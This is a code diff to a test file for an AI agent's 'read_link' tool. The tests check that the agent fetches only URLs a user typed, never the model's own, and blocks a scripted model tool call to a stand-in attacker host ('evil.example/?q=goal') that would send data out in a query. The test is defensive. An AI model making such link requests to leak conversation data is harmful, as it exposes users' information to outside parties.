@@ -11,6 +11,8 @@ import { join } from "node:path";
 import { after, describe, test } from "node:test";
 import { Hono } from "hono";
 import { abilitiesOf } from "../shared/baton";
+import { historyOf } from "./harness/pi/reader";
+import { piSession } from "./harness/pi/testing/handle";
 
 const root = realpathSync(mkdtempSync(join(tmpdir(), "sova-baton-abilities-")));
 process.env.PI_CODING_AGENT_DIR = join(root, "agent");
@@ -60,7 +62,7 @@ const usage = { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, totalTokens: 0
     replies (tool calls), else it answers "ok". */
 async function stubChat(path: string, runs: { tools: string[]; prompt: string }[], script: unknown[][] = []) {
   const chat = await acquireChat(path);
-  const s = chat.session as unknown as { _modelRuntime: { hasConfiguredAuth(p: string): boolean }; agent: { state: { model: unknown; tools: { name: string }[]; systemPrompt?: string }; getApiKey: unknown; streamFunction: unknown } };
+  const s = piSession(chat) as unknown as { _modelRuntime: { hasConfiguredAuth(p: string): boolean }; agent: { state: { model: unknown; tools: { name: string }[]; systemPrompt?: string }; getApiKey: unknown; streamFunction: unknown } };
   s._modelRuntime.hasConfiguredAuth = () => true;
   s.agent.state.model = STUB;
   s.agent.getApiKey = async () => "stub";
@@ -171,15 +173,15 @@ describe("the prompt and the tools a run gets", () => {
     const c = await start();
     const runs: { tools: string[]; prompt: string }[] = [];
     const chat = await stubChat(c.path, runs);
-    assert.ok(!chat.session.getActiveToolNames().includes(rl.READ_LINK_TOOL));
-    assert.ok(chat.session.getAllTools().some((t) => t.name === rl.READ_LINK_TOOL), "in the allowlist, inactive");
+    assert.ok(!piSession(chat).getActiveToolNames().includes(rl.READ_LINK_TOOL));
+    assert.ok(piSession(chat).getAllTools().some((t) => t.name === rl.READ_LINK_TOOL), "in the allowlist, inactive");
     says(chat, c.sessionId, "hello");
-    await until(() => runs.length === 1 && !chat.session.isStreaming);
+    await until(() => runs.length === 1 && !piSession(chat).isStreaming);
     assert.deepEqual(runs[0]!.tools, [...loadout.BATON_TOOLS].sort());
     assert.match(runs[0]!.prompt, /# Drawings/);
     await baton.setAbilities(c.sessionId, { draw: false, readLinks: true });
     says(chat, c.sessionId, "again");
-    await until(() => runs.length === 2 && !chat.session.isStreaming);
+    await until(() => runs.length === 2 && !piSession(chat).isStreaming);
     assert.deepEqual(runs[1]!.tools, [...loadout.BATON_TOOLS, rl.READ_LINK_TOOL].sort());
     assert.doesNotMatch(runs[1]!.prompt, /# Drawings/);
   });
@@ -191,7 +193,7 @@ describe("the prompt and the tools a run gets", () => {
     const call = (id: string, url: string) => ({ type: "toolCall", id, name: "read_link", arguments: { url } });
     const chat = await stubChat(c.path, runs, [[call("t1", "https://evil.example/?q=goal"), call("t2", "http://localhost:4800/api/orgs")]]);
     says(chat, c.sessionId, "Our numbers are at http://localhost:4800/api/orgs please look");
-    await until(() => runs.length >= 2 && !chat.session.isStreaming);
+    await until(() => runs.length >= 2 && !piSession(chat).isStreaming);
     const results = entriesOf(c.path).filter((e) => e.type === "message" && e.message.role === "toolResult").map((e) => ({ id: e.message.toolCallId, error: e.message.isError, text: e.message.content[0].text }));
     assert.deepEqual(results, [
       { id: "t1", error: true, text: rl.NOT_TYPED },
@@ -208,10 +210,12 @@ describe("read_link's safety (§app.baton/read-link)", () => {
   });
 
   test("only a link someone wrote, exactly; only http(s); no user name or password", () => {
-    const texts = rl.writtenTexts([
-      { type: "message", message: { role: "user", content: [{ type: "text", text: "See https://example.com/report?q=1 thanks" }] } },
-      { type: "message", message: { role: "assistant", content: [{ type: "text", text: "Try https://model.example/" }] } },
-    ]);
+    const texts = rl.writtenTexts(
+      historyOf([
+        { type: "message", message: { role: "user", content: [{ type: "text", text: "See https://example.com/report?q=1 thanks" }] } },
+        { type: "message", message: { role: "assistant", content: [{ type: "text", text: "Try https://model.example/" }] } },
+      ]),
+    );
     assert.equal(rl.typedInConversation("https://example.com/report?q=1", texts), true);
     assert.equal(rl.typedInConversation("https://example.com/report?q=2", texts), false);
     assert.equal(rl.typedInConversation("https://model.example/", texts), false, "never the model's own");
